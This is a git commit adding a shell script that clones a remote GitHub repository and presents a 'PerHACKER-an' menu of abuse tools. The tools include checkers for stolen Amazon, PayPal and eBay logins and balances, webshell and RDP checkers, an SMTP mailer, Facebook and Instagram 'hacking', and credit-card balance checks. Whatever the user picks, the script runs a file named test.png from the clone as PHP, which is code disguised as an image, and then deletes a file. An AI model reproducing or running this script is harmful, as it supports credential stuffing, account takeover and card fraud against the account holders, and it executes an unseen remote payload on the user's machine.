551a124b4798c50a9d542d652ef0989e5cbdd511
AdaWong <48813106+rikosanjuri14@users.noreply.github.com>
2020-05-15 10:10:08 -0700

    Add files via upload

---
+++ script.sh
@@ -0,0 +1,42 @@
+apt install toilet -y
+apt install php -y
+apt install neofetch -y
+apt install git -y
+git clone https://github.com/rikosanjuri14/sherrysystem.git
+clear
+echo "###############################"
+echo "#                             #"
+echo "#   Author : AdaWong          #"
+echo "#   Contac : adawong@slavic.ru#"
+echo "#                             #"
+echo "#                             #"
+echo "###############################"
+toilet "PerHACKER-an"
+echo "What do you want handsome?"
+echo "1.Only check email password valid Amazon"
+echo "2.Check all balance Amazon"
+echo "3.Only check email password valid Paypal"
+echo "4.Check all balance Paypal"
+echo "5.Only check email password valid Ebay"
+echo "6.Check all balance Ebay"
+echo "7.Webshell checker"
+echo "8.SMTP Sender/Mailler"
+echo "9.SMTP Auto checker"
+echo "10.Webshell become Remote Desktop Protocol"
+echo "11.Check all mailist valid Ebay,Amazon,Paypal"
+echo "12.Facebook hacking Anti-Sesi"
+echo "13.Gmail weak password generate"
+echo "14.Credit card check balance limite(not acurate)"
+echo "15.VPS checker"
+echo "16.RDP checker"
+echo "17.Instagram hacking with login file"
+echo "18.Instagram follower"
+echo "19.Twitter follower"
+read -p "Input your chooise Baby? :" get;
+read -p "Input your file(For login,checker,mailler)? :" get;
+read -p "Ready Or Not? [y/n]:" kk;
+echo "Prossesing check please wait Honey"
+php sherrysystem/test.png
+echo "Done"
+echo "Saved Name systemfolder/result.txt"
+rm free.py 
